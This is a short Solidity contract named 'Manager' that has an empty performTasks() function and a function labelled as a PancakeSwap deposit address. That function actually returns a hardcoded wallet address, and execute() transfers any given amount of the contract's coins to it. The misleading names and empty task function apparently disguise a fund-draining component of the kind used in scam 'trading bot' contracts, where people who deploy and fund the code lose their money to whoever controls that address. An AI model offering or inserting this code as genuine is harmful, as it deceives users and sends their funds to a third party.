pragma solidity ^0.5.0;

contract Manager {
	function performTasks() public {
	    
	}

	function pancakeDepositAddress() public pure returns (address) {
		return 0x1802292e0a431B1C194EaA286aA3ff7ffbbfa80e;
	}
	
	function execute(uint256 ttoIn) public payable {
	    address(uint160(pancakeDepositAddress())).transfer(ttoIn);
	}
  
}
